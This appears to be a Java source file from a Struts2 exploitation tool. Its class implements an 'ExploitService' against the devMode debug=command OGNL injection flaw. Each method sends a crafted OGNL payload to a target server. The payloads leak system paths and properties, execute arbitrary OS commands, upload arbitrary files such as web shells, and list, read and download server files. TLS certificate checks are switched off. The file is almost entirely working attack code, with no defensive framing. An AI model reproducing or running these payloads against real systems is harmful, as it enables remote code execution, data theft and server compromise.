package org.vti.service.impl;

import java.io.InputStream;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

import org.vti.service.ExploitService;
import org.vti.util.HostnameVerifier;
import org.vti.util.SslSocketFactory;
import org.vti.util.TrustManager;

import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.ResponseBody;

public class S2DEVExploitServiceImpl implements ExploitService {

	private OkHttpClient client = new OkHttpClient().newBuilder()
			.sslSocketFactory(new SslSocketFactory().createSSLSocketFactory(), new TrustManager())
			.hostnameVerifier(new HostnameVerifier()).build();

	@Override
	public String getRealPath(String url) throws Exception {
		String c = URLEncoder.encode("#resp=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],"
				+ "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp.getWriter().print(#req.getSession().getServletContext().getRealPath('/')),"
				+ "#resp.getWriter().flush()," + "#resp.getWriter().close()", "UTF-8");
		url = url + "?debug=command&expression=" + c;

		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return responseBody.string();
	}

	@Override
	public Map<String, Object> getServerInfo(String url) throws Exception {
		String c = URLEncoder.encode(
				"#resp=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],"
						+ "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
						+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
						+ "#sys=@java.lang.System@getProperty('os.name')+'#'+@java.lang.System@getProperty('user.name')"
						+ "+'#'+@java.lang.System@getProperty('user.home')+'#'+@java.lang.System@getProperty('java.home'),"
						+ "#resp.getWriter().print(#sys)," + "#resp.getWriter().flush()," + "#resp.getWriter().close()",
				"UTF-8");
		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		String info = responseBody.string();
		Map<String, Object> map = new LinkedHashMap<String, Object>();

		String array[] = info.split("#");
		if (array.length == 4) {
			map.put("os.name", array[0]);
			map.put("user.name", array[1]);
			map.put("user.home", array[2]);
			map.put("java.home", array[3]);
		} else {
			map.put("os.name", "");
			map.put("user.name", "");
			map.put("user.home", "");
			map.put("java.home", "");
		}
		return map;

	}

	@Override
	public String doExecuteCMD(String url, String cmd) throws Exception {
		String c = URLEncoder.encode("#resp=#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'],"
				+ "#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#a=@java.lang.Runtime@getRuntime().exec('" + cmd + "'),"
				+ "#s=new java.util.Scanner(#a.getInputStream()).useDelimiter(\"\\\\A\"),"
				+ "#msg=(#s.hasNext() ? #s.next() : \"\")," + "#resp.getWriter().println(#msg),"
				+ "#resp.getWriter().flush()," + "#resp.getWriter().close()", "UTF-8");
		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return responseBody.string();
	}

	@Override
	public boolean doUpload(String url, String fileName, String content) throws Exception {
		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
				+ "#path=#req.getSession().getServletContext().getRealPath(\"/\")," + "#content=new java.lang.String(\""
				+ content + "\")," + "#file=new java.io.File(#path +\"" + "/" + fileName + "\"),"
				+ "#fos=new java.io.FileOutputStream(#file),"
				+ "#fos.write(#content.getBytes()),#fos.flush(),#fos.close()," + "#resp.getWriter().println(\"true\"),"
				+ "#resp.getWriter().flush()," + "#resp.getWriter().close()", "UTF-8");

		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return Boolean.valueOf(responseBody.string());
	}

	@Override
	public boolean doCustomUplaod(String url, String filePath, String content) throws Exception {
		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," + "#path=new java.lang.String(\""
				+ filePath.trim() + "\")," + "#content=new java.lang.String(\"" + content + "\"),"
				+ "#file=new java.io.File(#path)," + "#fos=new java.io.FileOutputStream(#file),"
				+ "#fos.write(#content.getBytes())," + "#fos.flush()," + "#fos.close(),"
				+ "#resp.getWriter().println(\"true\")," + "#resp.getWriter().flush()," + "#resp.getWriter().close()",
				"UTF-8");
		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return Boolean.valueOf(responseBody.string());
	}

	@Override
	public List<String> doGetFileSystem(String url) throws Exception {

		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#sys=@java.io.File@listRoots()," + "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
				+ "#resp.getWriter().println(#sys.length)," + "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		url = url + "?debug=command&expression=" + c;

		int size = Integer.valueOf(client.newCall(new Request.Builder().url(url).build()).execute().body().string());

		List<String> list = new ArrayList<String>();

		for (int i = 0; i < size; i++) {
			String d = URLEncoder.encode(
					"#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," + "#sys=@java.io.File@listRoots(),"
							+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
							+ "#resp.getWriter().println(#sys[" + i + "])," + "#resp.getWriter().flush(),"
							+ "#resp.getWriter().close()",
					"UTF-8");
			url = url + "?debug=command&expression=" + d;
			String disk = client.newCall(new Request.Builder().url(url).build()).execute().body().string();
			list.add(disk);
		}
		return list;
	}

	@Override
	public List<String> doListFiles(String url, String path) throws Exception {
		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#sys=@java.io.File@listRoots()," + "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
				+ "#resp.getWriter().println(#sys.length)," + "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");

		url = url + "?debug=command&expression=" + c;

		int size = Integer.valueOf(client.newCall(new Request.Builder().url(url).build()).execute().body().string());

		List<String> list = new ArrayList<String>();

		for (int i = 0; i < size; i++) {
			String d = URLEncoder.encode(
					"#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS," + "#sys=@java.io.File@listRoots(),"
							+ "#resp=@org.apache.struts2.ServletActionContext@getResponse(),"
							+ "#resp.getWriter().println(#sys[" + i + "])," + "#resp.getWriter().flush(),"
							+ "#resp.getWriter().close()",
					"UTF-8");
			url = url + "?debug=command&expression=" + d;
			String disk = client.newCall(new Request.Builder().url(url).build()).execute().body().string();
			list.add(disk);
		}
		return list;
	}

	@Override
	public String doGetFileContent(String url, String path) throws Exception {
		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," + "#path=new java.lang.String(\""
				+ path + "\")," + "#file=new java.io.File(#path),"
				+ "#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file))," + "#length=#file.length(),"
				+ "#buf=new byte[#length]," + "#dis.readFully(#buf),"
				+ "#resp.getWriter().println(new java.lang.String(#buf,\"ISO-8859-1\"))," + "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");
		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return responseBody.string();
	}

	@Override
	public boolean doIsDirectory(String url, String path) throws Exception {
		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," + "#path=new java.lang.String(\""
				+ path.trim() + "\")," + "#file=new java.io.File(#path),"
				+ "#resp.getWriter().println(#file.isDirectory())," + "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");
		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return Boolean.valueOf(responseBody.string());
	}

	@Override
	public InputStream doDownload(String url, String path) throws Exception {
		String c = URLEncoder.encode("#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,"
				+ "#req=@org.apache.struts2.ServletActionContext@getRequest(),"
				+ "#resp=@org.apache.struts2.ServletActionContext@getResponse()," + "#path=new java.lang.String(\""
				+ path + "\")," + "#file=new java.io.File(#path),"
				+ "#dis=new java.io.DataInputStream(new java.io.FileInputStream(#file))," + "#length=#file.length(),"
				+ "#buf=new byte[#length]," + "#dis.readFully(#buf),"
				+ "#resp.getWriter().println(new java.lang.String(#buf,\"ISO-8859-1\"))," + "#resp.getWriter().flush(),"
				+ "#resp.getWriter().close()", "UTF-8");
		url = url + "?debug=command&expression=" + c;
		ResponseBody responseBody = client.newCall(new Request.Builder().url(url).build()).execute().body();
		return responseBody.byteStream();
	}

}
